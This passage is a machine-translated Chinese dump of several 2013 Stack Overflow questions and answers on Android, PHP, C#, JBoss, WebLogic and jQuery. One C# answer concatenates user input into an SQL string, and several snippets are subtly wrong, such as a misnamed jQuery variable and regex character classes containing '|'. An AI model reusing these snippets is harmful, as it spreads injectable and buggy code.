        tools:ignore="HardcodedText" >

        <LinearLayout
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:focusable="false"
            android:focusableInTouchMode="false"
            android:gravity="center_vertical"
            android:orientation="vertical" >

            <TextView
                android:id="@+id/list_item_group_name"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:focusable="false"
                android:focusableInTouchMode="false"
                android:singleLine="true"
                android:text="User 22222222222222222222123456789012345"
                android:textColor="@drawable/list_item_group_item_header_text"
                android:textSize="16sp"
                android:textStyle="bold"
                android:typeface="sans" />

            <TextView
                android:id="@+id/list_item_group_status"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:focusable="false"
                android:focusableInTouchMode="false"
                android:singleLine="true"
                android:text="Group status..."
                android:textColor="@drawable/list_item_group_item_status_text"
                android:textSize="12sp"
                android:typeface="sans" />
        </LinearLayout>

        <TextView
            android:id="@+id/list_item_group_callout"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginRight="5dp"
            android:background="@drawable/callout_background"
            android:focusable="false"
            android:focusableInTouchMode="false"
            android:gravity="center"
            android:singleLine="true"
            android:text="new"
            android:textColor="@drawable/callout_text"
            android:textSize="10sp"
            android:textStyle="bold"
            android:typeface="sans" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/list_item_group_toolbar"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/list_item_group_toolbar_background"
        android:baselineAligned="false"
        android:focusable="false"
        android:focusableInTouchMode="false"
        android:orientation="horizontal"
        android:padding="5dp" >

        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:focusable="false"
            android:focusableInTouchMode="false"
            android:gravity="center" >

            <Button
                android:id="@+id/list_item_group_edit"
                android:layout_width="35dp"
                android:layout_height="35dp"
                android:background="@drawable/list_item_group_edit_background"
                android:focusable="false"
                android:focusableInTouchMode="false" />
        </LinearLayout>

        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:focusable="false"
            android:focusableInTouchMode="false"
            android:gravity="center" >

            <Button
                android:id="@+id/list_item_group_delete"
                android:layout_width="35dp"
                android:layout_height="35dp"
                android:background="@drawable/list_item_group_delete_background"
                android:focusable="false"
                android:focusableInTouchMode="false" />
        </LinearLayout>
    </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T10:47:37.203

我已将代码更改为以下代码，现在可以正常工作了。

```
@Override
  public void onStart() {
    super.onStart();
    getListView().setOnItemClickListener(new OnItemClickListener() {

      @Override
      public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
        Group group = (Group) getListView().getItemAtPosition(position);
        mCallbacks.onItemSelected(group);
      }
    });
  } 
```

我不确定为什么将点击侦听器移动到 onStart() 方法有效，但它确实有效。

# android - 切换片段 - Google Map Fragment V2 - Activity 已被销毁错误

> ID：15232493
> 
> 赞同：9
> 
> 时间：2013-03-05T19:31:05.540
> 
> 标签：android, android-fragments, android-activity, mapfragment, supportmapfragment

我有一个地图活动（SherlockFragmentActivity），它加载到一个地图片段中，该片段有 2 个按钮并在显示 2 个不同片段（GoogleMapFragment 和 ScaleImageViewFragment）之间切换

![截屏](../Images/c7b9ee7f43bf4f8ec899bbe1097bab2f.png)

当我单击 Exhibitor Map 按钮时，它会替换片段，但是当我单击返回时，我收到“java.lang.IllegalStateException：活动已被破坏”错误

```
ERROR/AndroidRuntime(5768): FATAL EXCEPTION: main
    java.lang.IllegalStateException: Activity has been destroyed
    at android.support.v4.app.FragmentManagerImpl.enqueueAction(FragmentManager.java:1342)
    at android.support.v4.app.BackStackRecord.commitInternal(BackStackRecord.java:595)
    at android.support.v4.app.BackStackRecord.commit(BackStackRecord.java:574)
    at com.takeit2eleven.towniemeeting.android.fragments.GoogleMapFragment.onCreateView(GoogleMapFragment.java:42)
    at android.support.v4.app.Fragment.performCreateView(Fragment.java:1460)
    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:911)
    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1088)
    at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:682)
    at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1444)
    at android.support.v4.app.FragmentManagerImpl$1.run(FragmentManager.java:429)
    at android.os.Handler.handleCallback(Handler.java:615)
    at android.os.Handler.dispatchMessage(Handler.java:92)
    at android.os.Looper.loop(Looper.java:137)
    at android.app.ActivityThread.main(ActivityThread.java:4745)
    at java.lang.reflect.Method.invokeNative(Native Method)
    at java.lang.reflect.Method.invoke(Method.java:511)
    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
    at dalvik.system.NativeStart.main(Native Method) 
```

这是我的 MapsFragment.java 文件：

```
public class MapsFragment extends SherlockFragment {

Button mHotelMapButton;
Button mExhibitorButton;
GoogleMapFragment mGoogleMapFragment;
ScaleImageViewFragment mScaleImageViewFragment;
static boolean mShowingGoogleMap = true;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (savedInstanceState != null) {
        mShowingGoogleMap = savedInstanceState.getBoolean("showingGoogleMap");
    }

    mGoogleMapFragment = new GoogleMapFragment();
    mScaleImageViewFragment = new ScaleImageViewFragment();

}

@Override
public void onSaveInstanceState(Bundle outState) {
    super.onSaveInstanceState(outState);
    outState.putBoolean("showingGoogleMap", mShowingGoogleMap);

}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

    View view = inflater.inflate(R.layout.maps_fragment, null);
    mHotelMapButton = (Button) view.findViewById(R.id.hotel_button);
    mExhibitorButton = (Button) view.findViewById(R.id.exhititor_map_button);

    mExhibitorButton.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            mShowingGoogleMap = false;
            showExhibitorFragment();
        }
    });

    mHotelMapButton.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            mShowingGoogleMap = true;
            showGoogleMapFragment();
        }
    });

    return view;

}

@Override
public void onPause() {
    super.onPause();
    getChildFragmentManager().beginTransaction()
            .remove(mGoogleMapFragment)
            .remove(mScaleImageViewFragment).commit();
}

@Override
public void onResume() {
    super.onResume();

    if(mShowingGoogleMap){
        showGoogleMapFragment();

    }else{
        showExhibitorFragment();
    }
}

private void showExhibitorFragment(){
    getChildFragmentManager().beginTransaction()
            .remove(mGoogleMapFragment)
            .remove(mScaleImageViewFragment)
            .replace(R.id.fragment_placeholder, mScaleImageViewFragment, "scaleImage")
            .commit();
}
private void showGoogleMapFragment(){
    getChildFragmentManager().beginTransaction()
            .remove(mGoogleMapFragment)
            .remove(mScaleImageViewFragment)
            .replace(R.id.fragment_placeholder, mGoogleMapFragment, "mapFragment")
            .commit();
}
} 
```

和我的 GoogleMapFragment.java 文件：

```
public class GoogleMapFragment extends Fragment {
private SupportMapFragment mMapFragment;
private GoogleMap mMap;
private final LatLng PLANET_HOLLYWOOD = new LatLng(36.1100, -115.1710);

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    GoogleMapOptions mapOptions = new GoogleMapOptions();
    mapOptions.compassEnabled(true).camera(new CameraPosition(PLANET_HOLLYWOOD, 13, 0f, 0f));
    mMapFragment = SupportMapFragment.newInstance(mapOptions);
}

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
                         Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    View view = inflater.inflate(R.layout.google_map, container, false);

    getChildFragmentManager()
            .beginTransaction()
            .add(R.id.map_holder, mMapFragment)
            .commit();

    return view;

}

@Override
public void onPause() {
    super.onPause();
    getChildFragmentManager().beginTransaction()
            .remove(mMapFragment)
            .commit();
}

@Override
public void onResume() {
    super.onResume();

    mMap = mMapFragment.getMap();
    if(mMap != null){
        mMap.addMarker(new MarkerOptions().position(PLANET_HOLLYWOOD).title("Planet Hollywood"));
    }
}
} 
```

很长一段时间以来，我一直把头撞在墙上，试图找出这个错误以及如何避免/修复它。

更新：

顺便说一句，如果我切换到：

```
getActivity().getSupportFragmentManager()
            .beginTransaction()
            .add(R.id.map_holder, mMapFragment)
            .commit(); 
```

在 GoogleMapFragment 中然后我没有收到错误，但我无法抓住地图来设置制造商......这似乎是一个竞争条件

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-24T07:14:31.940

如果您删除所有嵌套片段，则可以解决此问题`onDestroyView()`：

```
public void onDestroyView() 
{
        super.onDestroyView(); 
        Fragment fragment = (getFragmentManager().findFragmentById(R.id.map));  
        FragmentTransaction ft = getActivity().getSupportFragmentManager().beginTransaction();
        ft.remove(fragment);
        ft.commit();
} 
```

并像往常一样膨胀它们`onCreateView()`：

```
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
    return inflater.inflate(R.layout.map, container, false);
} 
```

# javascript - 水平添加此小部件仅在 Safari 中垂直堆叠

> ID：15232496
> 
> 赞同：0
> 
> 时间：2013-03-05T19:31:29.840
> 
> 标签：javascript, html, css, addthis

示例：[www.dirtycookie.co](http://dirtycookie.co)

查看 Firefox（或任何其他浏览器）和 Safari。

Firefox 具有所需的行为。

这是我的 AddThis 代码：

```
<div class="addthis_toolbox addthis_default_style" style="text-align:center;">
<a class="addthis_button_facebook_like" fb:like:layout="button_count"     addthis:url="http://www.facebook.com/TheDirtyCookie"></a>
<a class="addthis_button_tweet"></a>
<a class="addthis_button_pinterest_pinit" pi:pinit:url="http://www.dirtycookie.co"    pi:pinit:layout="horizontal" always-show-count="1" pi:pinit:size="small"></a> 
<a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
<a class="addthis_button_stumbleupon_badge"></a>  
<a class="addthis_counter addthis_pill_style"></a>
</div> 
```

JavaScript：

```
<script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js"></script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:40:21.193

它也在 Chrome 上发生（最新）..

您的 CSS 和小部件 CSS(addThis) 发生冲突.... .....通过在您的 style.css 中添加它来覆盖它：

```
.addthis_default_style .addthis_separator, 
.addthis_default_style .at300b, 
.addthis_default_style .at300bo, 
.addthis_default_style .at300m, 
.addthis_default_style .at300bs {
    float: left !important;
} 
```

# php - 试图避免使用 PHP 重新提交表单

> ID：15232497
> 
> 赞同：0
> 
> 时间：2013-03-05T19:31:32.757
> 
> 标签：php, forms, post, submit

我试图通过执行以下操作来避免重新提交表单中的某些项目：

```
if(isset($_REQUEST['command']) && $_REQUEST['command']=='add' && $_REQUEST['itemId']>0)
{
    if (array_key_exists($pid, $_SESSION['cart']['itemId']))
    { 
    }
    else 
    {
        $pid=$_REQUEST['itemId'];
        addtocart($pid,1);
        $itemAdded = 1;
        $max = 0; 
foreach ($_SESSION['cart'] as $item) 
    { 
        $max = $max + $item['qty']; 
    }
    }
header("Location: http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
exit();
} 
```

但是，我不断收到“此网页有重定向循环”。问题是我希望我的网站回到同一个网站，但不再进入 If。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:33:53.157

`unset($_POST);`提交后使用或只是重定向到另一个页面。这就是大多数网站的做法。

# php - 使用时间戳，检查即将到期

> ID：15232498
> 
> 赞同：0
> 
> 时间：2013-03-05T19:31:41.467
> 
> 标签：php

我是使用时间戳的新手，我试图想出一种方法来确定当前日期是否比存储在数据库中的日期不到 48 小时。

我想知道是否有人可以帮助我完成这个？

这是我尝试过的，我不确定这是否是最好的解决方案：

```
//future date stored in DB
$timestamp = strtotime($regularFormatDate);

if($timestamp < strtotime("+2 days")){
    //do something
} 
```

我很感激任何建议！

提前谢谢了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:59:42.700

你的例子看起来不错。实际上，我更关心您打算如何处理闰年/夏令时。

***如果使用 PHP 5.3 或更高版本。除了坚持使用时间戳，我建议（支持夏令时等）：***

### 程序

```
 $datetime1 = date_create('now');
        $datetime2 = date_create('2013-03-07');
        $interval = date_diff($datetime1, $datetime2);
        $days = $interval->format('%R%a');
        if ((int) $days >= 2) {
            echo '2 or more days';
            echo '<br />';
            echo 'Difference: ' . $days . ' days';
        } else {
            echo 'Bearly ' . $days . ' day or less';
        } 
```

### 目的

```
 $date1 = new DateTime("2013-03-09");
        $date2 = new DateTime("now");
        $interval = $date1->diff($date2);
        $difference =  $interval->days;
        if($difference >= 2){
            echo $difference;
        } 
```

### 您可以尝试直接使用mysql：

阅读：[https ://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-add](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-add)

```
mysql> SELECT INTERVAL 1 DAY + '2008-12-31';
    -> '2009-01-01'

Mysql date_add() and datediff() are also good alternatives. 
```

PHP 日期时间差异：[http ://www.php.net/manual/en/datetime.diff.php](http://www.php.net/manual/en/datetime.diff.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:04:01.087

OR:
$t = time() // Unix 格式的一天中的时间
$t += 172800; // 48 小时内的秒数 - 从现在开始的 48 小时

# ios5 - UITabbarController 每个视图控制器的方向不同

> ID：15232500
> 
> 赞同：1
> 
> 时间：2013-03-05T19:31:48.463
> 
> 标签：ios5, ios6, uitabbarcontroller, uiinterfaceorientation

问题很简单。
我有一个 UITabbarcontroller 设置为 rootviewcontroller。UITabbarcontroller 包含 2 个视图控制器

1.  firstViewcontroller (portarit)
2.  secondViewController（横向）

问题是当我选择第二个视图控制器时，视图和 tabar 不会以横向显示，直到或除非我自己更改方向，反之亦然。

需要知道实现它的可能步骤。

重要的事情...

```
- (NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window; 
```

上述方法仅在设备旋转时调用。因此它适用于手动旋转，但在选项卡栏项目选择时。它实际上并没有做任何事情。

# maven - 嵌入式引导 Jboss 数据源驱动程序问题

> ID：15232504
> 
> 赞同：0
> 
> 时间：2013-03-05T19:32:02.433
> 
> 标签：maven, jboss, junit

我已经在这个问题上工作了几天，这让我发疯了。

我有一段使用 Jboss 4.2.3 的遗留代码。我最近将项目转换为 Maven 进行依赖管理，但是为项目编写的单元测试需要数据源。当我禁用测试时，程序工作得很好，但是当我启用测试时，它会抛出以下内容：

```
java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver 
```

我在 pom 文件中列出了 jboss 嵌入式依赖项。

```
<dependency>
    <groupId>org.jboss.embedded</groupId>
    <artifactId>jboss-embedded-all</artifactId>
    <version>beta3.SP12</version>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>org.jboss.embedded</groupId>
    <artifactId>jboss-embedded</artifactId>
    <version>beta3.SP12</version>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>org.jboss.embedded</groupId>
    <artifactId>hibernate-all</artifactId>
    <version>beta3.SP12</version>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>org.jboss.embedded</groupId>
    <artifactId>thirdparty-all</artifactId>
    <version>beta3.SP12</version>
    <scope>test</scope>
</dependency>

<plugin>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>2.4.3</version>
    <configuration>
        <additionalClasspathElements>
            <additionalClasspathElement>src/test/bootstrap</additionalClasspathElement>
        </additionalClasspathElements>
        <forkMode>once</forkMode>
        <argLine>-Dsun.lang.ClassLoader.allowArraySyntax=true</argLine>
        <includes>
            <include>**/*Test.java</include>
        </includes>
        <skip>false</skip>
    </configuration>
</plugin> 
```

在 src/test/bootstrap/deploy 中，我放置了 dev-ds.xml 文件，该文件正在被容器拾取。

```
Bound ConnectionManager 'jboss.jca:service=DataSourceBinding,name=jdbc/theDS' to JNDI name 'java:jdbc/theDS' 
```

我的 dev-ds 文件看起来像这样（有些混淆，请原谅任何拼写错误）

```
<datasources>
    <local-tx-datasource>
        <jndi-name>jdbc/theDS</jndi-name>
        <connection-url>jdbc:oracle:thin:@xxx.xxx.xxx:1521:DEVDB</connection-url>
        <driver-class>oracle.jdbc.driver.OracleDriver</driver-class>
        <user-name>user</user-name>
        <password>password</password>
    </local-tx-datasource>
</datasources> 
```

实际测试本身使用 Mockito 来尝试获取数据源。

```
@BeforeClass
public static void setUpClass() throws Exception 
    {
    if( ! containerRunning )
        {
        Bootstrap bootstrap = Bootstrap.getInstance();
        bootstrap.bootstrap();
        containerRunning = true;
        }
    }

@Before
public void setUp()
    {
    MyDAO dao = spy( new MyDAO() );
    try
        {
        InitialContext ctx = new InitialContext();
        dao.datasource = (DataSource) ctx.lookup( "java:jdbc/theDS" );
        Connection conn = dao.datasource.getConnection(); //bang, we're dead
        } 
```

例外：

```
Could not create connection; - nested throwable: (org.jboss.resource.JBossResourceException: Failed to register driver for: oracle.jdbc.driver.OracleDriver; - nested throwable: (java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver)); - nested throwable: (org.jboss.resource.JBossResourceException: Could not create connection; - nested throwable: (org.jboss.resource.JBossResourceException: Failed to register driver for: oracle.jdbc.driver.OracleDriver; - nested throwable: (java.lang.ClassNotFoundException: oracle.jdbc.driver.OracleDriver) 
```

正如我所提到的，代码在运行时有效，所以我知道 ojdbc6.jar 位于 ${jboss.dir}/server/default/lib 中。但可以肯定的是，我尝试将其添加到构建路径中，并且尝试了 Eclipse 中的“订购和导出”，但均无济于事。我的想法不多了。如果我错过了什么，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T19:21:35.610

这是一种解决方法，但它现在可以工作。在 maven-surefire-plugin 中，我添加了以下行。

```
<additionalClasspathElement>lib/ojdb6.jar</additionalClasspathElement> 
```

我还为 DAO 对象创建了一个测试构造函数，因为数据源的创建是在构造函数中完成的，而 Mockito 不会覆盖它。所有这些工作都是为了发现测试可能从一开始就没有奏效。:)

为了帮助在这里偶然发现的任何人，在引导程序中，它不允许您将 InitialContext 中的任何内容绑定到全局范围。IE

```
InitialContext ctx = new InitialContext();
ctx.createSubcontext( "jdbc/theDS" ); //Does not work 
```

根据我在互联网上收集的信息，嵌入式 jboss 只知道环境范围。

# php - 将字符串与正则表达式匹配的问题

> ID：15232508
> 
> 赞同：1
> 
> 时间：2013-03-05T19:32:09.180
> 
> 标签：php, regex, remote-host

我正在创建一些 Intranet 软件并确定计算机所在的房间号和 PC 号，我正在使用 REMOTE_HOST 服务器阵列。

这是我的代码：

```
$hostname = $_SERVER['REMOTE_HOST'];
//Check to see if the computer name is compatible with room auto-detect
if (preg_match("/G|F\d{1,2}-.*?-PC\d{1,2}.*?/i", $hostname)) {
    $room = explode("-", $hostname);
    $pc = explode(".", $room[2]);
} else {
    $pc[0] = "NA";
    $room[0] = "other";
} 
```

如果计算机名称如下所示，则此陈述必须为真：

*   `g22-dell-pc23.roundhay.local`
*   `f48-lenovo-pc02.roundhay.local`
*   `g6-asus-pc18.roundhay.local`

如果语句与上述不同，则需要将房间和 pc 数组恢复为 NA 和其他。

我可以成功提取房间号和 PC，但是当一台具有非标准名称的 PC 使用该软件时，它仍然会尝试提取信息并且该软件失败，因为它没有信息可以继续。

例如：

> g22-smartboard.roundhay.local

该软件仍会尝试获取 PC 号码，即使它与我的正则表达式不匹配。但是，在我的计算机名称为 JOSH-PC 的测试 PC 上，它确实会退回到默认信息。

我已经测试了我的正则表达式，每当名称以 G 或 F 开头时，它似乎都是正确的。

我需要它专门匹配这些要求：

*   第一个字母是 G 或 F
*   然后是 0 - 9 的一位或两位数字
*   然后 -
*   然后任意数量的字母 az
*   然后 -
*   然后是字母 PC
*   然后是 0 - 9 的一位或两位数字
*   然后什么

我已经尝试了各种方法来让它工作，但我只是不正确理解正则表达式。我已经查过了，但它太令人困惑了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:41:07.590

正则表达式：

```
/[g|f]\d{1,2}-[a-z]+-pc\d{1,2}.+/i 
```

应该管用。我使用[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)来构建表达式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:41:09.483

试试这个正则表达式`[G|F]\d{1,2}-[a-z]+-pc\d{1,2}.+`

正则表达式的一个很好的资源是[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)

# c# - 在表格中输入的数据不会插入到表格中

> ID：15232512
> 
> 赞同：2
> 
> 时间：2013-03-05T19:32:31.943
> 
> 标签：c#, .net, sql

我在数据表中看不到添加的数据，这是代码：

我正在使用 Visual Studio 2010 Express。

```
private void button1_Click(object sender, EventArgs e)
{
    string t1 = textBox1.Text;

    SqlCeConnection conn =
       new SqlCeConnection(@"Data Source=|DataDirectory|\Database1.sdf");

    conn.Open();

    SqlCeCommand cmdInsert = conn.CreateCommand();
    cmdInsert.CommandText = "INSERT TO table_name (Column1) VALUES (t1)";

    cmdInsert.ExecuteNonQuery();

    conn.Close();
} 
```

单击按钮后它不会插入数据表，它给我一个错误

```
cmdInsert.ExecuteNonQuery(); 
```

它会调试它，但是当我单击按钮时，它会显示一条错误消息

> *SqlCeException 未处理。解析查询时出错。[令牌行号 = 1，令牌行偏移量 = 8，错误令牌 = TO ]*

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T19:37:43.487

尝试：

```
cmdInsert.Parameters.AddWithValue("@t1", textBox1.Text);
cmdInsert.CommandText = "insert INTO table_name (Column1) VALUES (@t1)"; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:39:10.523

您的代码有两个问题：

*   SQL 语句中的语法错误 - 您应该编写`INSERT INTO`而不是`INSERT TO`.
*   您不能`t1`直接在 SQL 字符串中使用。尽管您可以按照其他评论中的建议连接字符串，但最好使用参数化命令。

这是更正后的版本：

```
SqlCeCommand cmdInsert = conn.CreateCommand();
cmdInsert.CommandText = "INSERT INTO table_name (Column1) VALUES (@t1)";
cmdInsert.Parameters.AddWithValue("@t1", t1);
cmdInsert.ExecuteNonQuery(); 
```

请参阅[为什么我们需要 SqlCeCommand.Parameters.AddWithValue() 来插入值？](https://stackoverflow.com/questions/5592609/why-do-we-need-sqlcecommand-parameters-addwithvalue-to-insert-a-value)有关命令参数的更多详细信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T19:37:05.843

您的 sql 查询错误。

代替

```
cmdInsert.CommandText = "INSERT TO table_name (Column1) VALUES (t1)"; 
```

应该有

```
cmdInsert.CommandText = "INSERT INTO table_name (Column1) VALUES (t1)"; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-05T19:40:53.907

```
string t1 = textBox1.Text;
            SqlCeConnection conn = new SqlCeConnection(@"Data Source=|DataDirectory|\Database1.sdf");
            conn.Open();
            SqlCeCommand cmdInsert = conn.CreateCommand();
            cmdInsert.CommandText = "INSERT into table_name (Column1) VALUES ('" + t1 + "')";
            cmdInsert.ExecuteNonQuery();
            conn.Close(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-05T19:39:13.997

您需要传递 的值`t1`，可能带有参数。

```
private void button1_Click(object sender, EventArgs e)
{
    string t1 = textBox1.Text;
    SqlCeConnection conn =
       new SqlCeConnection(@"Data Source=|DataDirectory|\Database1.sdf");
    conn.Open();
    SqlCeCommand cmdInsert = conn.CreateCommand();
    cmdInsert.CommandText = "INSERT INTO table_name (Column1) VALUES (@t1)";
    var parameter = cmdInsert.CreateParameter();
    parameter.Value = t1;
    parameter.ParameterName = "@t1";

    cmdInsert.Parameters.Add(parameter);

    cmdInsert.ExecuteNonQuery();
    conn.Close();
} 
```

# jersey - 来自 WebLogic 12c Web 应用程序的多个引用共享库

> ID：15232513
> 
> 赞同：3
> 
> 时间：2013-03-05T19:32:35.007
> 
> 标签：jersey, weblogic, moxy, weblogic12c

我正在尝试使用 Moxy 2.4.1（更新的 JAXB impl）和 Jersey 1.17（更新的 JAX-RS impl）。我将共享库模块（作为库）部署到服务器没有问题。

在我正在开发的应用程序（WAR）中，我尝试从 weblogic.xml 文件中引用它们，如下所示：

```
<library-ref>
    <library-name>EclipseLink-2.4.1</library-name>
    <specification-version>2.4.1</specification-version>
    <implementation-version>2.4.1.v20121003-ad44345</implementation-version>
    <exact-match>true</exact-match>
</library-ref>
<library-ref>
    <library-name>Jersey-1.17</library-name>
    <specification-version>1.17</specification-version>
    <implementation-version>1.17.0</implementation-version>
    <exact-match>true</exact-match>
</library-ref> 
```

但似乎只有第一个引用的库被使用了。如果我使用类加载器分析工具 (wls-cat)，我只会看到一个 FilteringClassLoader，并且过滤器模式只匹配第一个共享库的包。切换顺序给了我另一个库。

查看[http://xmlns.oracle.com/weblogic/weblogic-web-app/1.4/weblogic-web-app.xsd](http://xmlns.oracle.com/weblogic/weblogic-web-app/1.4/weblogic-web-app.xsd)表明 library-ref 是无界的。

除了合并共享库并且每个应用程序只使用一个库引用之外，我还能做什么？

编辑：请注意，我使用的是共享库（WebLogic 特定功能）而不是可选包（EE 标准功能）。两种方法的库定义相同，但哪些类型的模块可以是库以及引用它们的方式不同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-22T01:10:36.520

如果您使用的是 WAR 文件，则在清单中包含共享库的适当方法是：http: [//docs.oracle.com/cd/E17904_01/web.1111/e13706/libraries.htm#i1070938](http://docs.oracle.com/cd/E17904_01/web.1111/e13706/libraries.htm#i1070938)

请参阅标题为“从 Java EE 应用程序或模块中引用可选包”的部分：

> 任何 Java EE 归档（JAR、WAR、RAR、EAR）都可以使用归档清单文件中的属性引用一个或多个已注册的可选包。

WAR 文件还有一个清单，您可以在其中定义要提取的共享库。weblogic.xml 不会为 WAR 文件执行此操作。weblogic.xml 中的 library-ref 用于 SPI 的非共享库。

执行您所要求的正确方法是使用 MANIFEST.MF 文件。对于此特定示例，您将执行以下操作：

```
Extension-List EclipseLink Jersey
EclipseLink-Extension-Name: EclipseLink
EclipseLink-Specification-Version: 2.4.1
EclipseLink-Implementation-Version: 2.4.1.v20121003-ad44345
Jersey-Extension-Name: Jersey
Jersey-Specification-Version: 1.17
Jersey-Implementation-Version: 1.17.0 
```

如果您需要，我可以提供一个如何使用 Maven 执行此操作的示例。我已经这样做了很多年了：）

下面是 WebLogic 中共享库的概述。我以为它有关于 WARS 的具体示例，但我想我把它省略了:)

[http://www.youtube.com/watch?v=ArLTKapjV_8](http://www.youtube.com/watch?v=Kh8h_jQYScI)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-01-27T13:18:46.193

要检测对共享库的 Classloader 的引用，您必须将 weblogic-application.xml 添加到 EAR 的 META-INF 目录。

你耳朵的结构如下：

```
yourEarFile.ear
    META-INF
         weblogic-application.xml
    yourWarFile.war 
```

yourEarFile/META-INF

```
<?xml version="1.0" encoding="UTF-8"?>
<weblogic-application
    xmlns="http://xmlns.oracle.com/weblogic/weblogic-application"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/ejb-jar_3_0.xsd http://xmlns.oracle.com/weblogic/weblogic-application http://xmlns.oracle.com/weblogic/weblogic-application/1.2/weblogic-application.xsd">

    <xml> 
        <parser-factory> 
            <saxparser-factory>org.apache.xerces.jaxp.SAXParserFactoryImpl</saxparser-factory>
            <document-builder-factory>org.apache.xerces.jaxp.DocumentBuilderFactoryImpl</document-builder-factory> 
        </parser-factory> 
    </xml> 

<library-ref>
    <library-name>EclipseLink-2.4.1</library-name>
    <specification-version>2.4.1</specification-version>
    <implementation-version>2.4.1.v20121003-ad44345</implementation-version>
    <exact-match>true</exact-match>
</library-ref>
<library-ref>
    <library-name>Jersey-1.17</library-name>
    <specification-version>1.17</specification-version>
    <implementation-version>1.17.0</implementation-version>
    <exact-match>true</exact-match>
</library-ref>

</weblogic-application> 
```

# jquery - 使用 JQuery 将数据输入 HTML 表的最佳方法是什么？

> ID：15232514
> 
> 赞同：2
> 
> 时间：2013-03-05T19:32:36.690
> 
> 标签：jquery, html

我有这张桌子：

```
 <div id="customer-content">
            <table>
                <caption>Customer Details</caption>
                <tr>
                    <th>Customer no</th>
                    <td>customer-no</td>
                </tr>
                <tr class="alt">
                    <th>First name</th>
                    <td>first-name</td>
                </tr>
                <tr>
                    <th>Last name</th>
                    <td>last-name</td>
                </tr>
                <tr class="alt">
                    <th>Phone number</th>
                    <td>phone-number</td>
                </tr>
                <tr>
                    <th>Date of birth</th>
                    <td>dob</td>
                </tr>                   
            </table>
        </div> 
```

通过 jQuery 向其中输入一些数据的最佳方法是什么：

```
 $('div#customer-content table tr td').text( '1234' ); 
```

以上对客户没有问题，但我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:34:29.113

```
var texts = ['text1','text2','text3',...];
var i = 0;
$('div#customer-content table tr td').each(function(){$(this).text( text[i] );i++;}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:38:21.993

另一种方法可能是这样的：-

```
$('div#customer-content table tr td').eq(0).text( '1234' ); 
```

这会将 1234 输入到行中的第一个单元格中（我们在 javascript 中使用零作为数组中的第一项）。要进入第二个，您将使用：-

```
$('div#customer-content table tr td').eq(1).text( '1234' ); 
```

依此类推，不断增加 eq 选择器中的值。

[小提琴](http://jsfiddle.net/eQ6KC/)

# android - Android：从另一个应用程序启动谷歌地图应用程序失败

> ID：15232520
> 
> 赞同：0
> 
> 时间：2013-03-05T19:32:51.670
> 
> 标签：android, android-intent, android-emulator

